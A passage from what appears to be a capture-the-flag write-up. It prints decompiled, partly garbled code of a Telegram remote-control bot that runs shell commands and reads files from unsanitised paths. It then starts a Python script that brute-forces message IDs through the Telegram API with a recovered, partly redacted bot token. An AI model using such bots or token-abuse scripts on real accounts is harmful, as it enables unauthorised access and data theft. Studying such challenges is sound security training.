+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">telegram_user_id&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">id&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">execute_system_command&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">max_message_length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">2048&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">output&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">subprocess&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getstatusoutput&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">output&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">max_message_length&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">output&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">][:&lt;/span>&lt;span class="n">max_message_length&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">output&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">begin&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">verify_telegram_id&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_user&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hostname&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;hostname&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">current_user&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">execute_system_command&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;Running as: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">hostname&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">/&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">current_user&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">reply_to&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">begin&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">message_handler&lt;/span>&lt;span class="p">([&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;start&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;commands&amp;#39;&lt;/span>&lt;span class="p">,))(&lt;/span>&lt;span class="n">begin&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">injectFlag&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">verify_telegram_id&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_user&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;type flag.txt&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">reply_to&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Flag&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">injectFlag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">message_handler&lt;/span>&lt;span class="p">([&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;flag&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;commands&amp;#39;&lt;/span>&lt;span class="p">,))(&lt;/span>&lt;span class="n">injectFlag&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">view_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">verify_telegram_id&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_user&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39; &amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">file_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39; &amp;#39;&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">platform&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;Windows&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">execute_system_command&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;type &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">file_path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">execute_system_command&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;cat &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">file_path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">reply_to&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">view_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">message_handler&lt;/span>&lt;span class="p">([&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;viewFile&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;commands&amp;#39;&lt;/span>&lt;span class="p">,))(&lt;/span>&lt;span class="n">view_file&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">download_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Unsupported&lt;/span> &lt;span class="n">opcode&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">RERAISE&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">verify_telegram_id&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_user&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39; &amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">file_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39; &amp;#39;&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># WARNING: Decompyle incomplete&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">download_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">message_handler&lt;/span>&lt;span class="p">([&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;downloadFile&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;commands&amp;#39;&lt;/span>&lt;span class="p">,))(&lt;/span>&lt;span class="n">download_file&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">handle_document_upload&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Unsupported&lt;/span> &lt;span class="n">opcode&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">RERAISE&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">verify_telegram_id&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_user&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># WARNING: Decompyle incomplete&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">handle_document_upload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">message_handler&lt;/span>&lt;span class="p">([&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;document&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;content_types&amp;#39;&lt;/span>&lt;span class="p">,))(&lt;/span>&lt;span class="n">handle_document_upload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">handle_any_command&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">verify_telegram_id&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_user&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">startswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/start&amp;#39;&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">reply_to&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">handle_any_command&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">message_handler&lt;/span>&lt;span class="p">()(&lt;/span>&lt;span class="n">handle_any_command&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">infinity_polling&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Based on the code above, the assumption is that the flag is stored in a chat between the author and the bot.&lt;/p>
+&lt;p>The specific message stored by the bot needs to be forwarded using the &lt;strong>forwardMessage&lt;/strong> Telegram API call method. With the bot &lt;strong>API key&lt;/strong> and &lt;strong>chat ID&lt;/strong> available, the API request can be constructed once the missing part, which is the &lt;strong>message ID&lt;/strong>, is found&lt;/p>
+&lt;p>The API request should look like this:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://api.telegram.org/bot&amp;lt;api_key&amp;gt;/forwardMessage?from_chat_id=&amp;lt;chat_id&amp;gt;&amp;amp;message_id=&amp;lt;message_id&amp;gt;&amp;amp;chat_id=&amp;lt;chat_id&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Create a python script to brute force the message id.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">api_url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;https://api.telegram.org/bot&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">/forwardMessage&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bot_token&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;6610257712:&amp;lt;REDACTED&amp;gt;AAFq_tYFDs5ZpWttF94KchKyzULBVQUW0PY&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">from_chat_id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;6212716112&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">chat_id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;6212716112&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">start_message_id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">brute_force_message_id&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">message_id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">start_message_id&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="kc">True&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">api_url&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bot_token&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;from_chat_id&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">from_chat_id&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;message_id&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">message_id&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;chat_id&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">chat_id&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">status_code&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="s1">&amp;#39;result&amp;#39;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">response_data&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="s1">&amp;#39;ihack&amp;#39;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">response_data&lt;/span>&lt;span class="p">):&lt;/span>
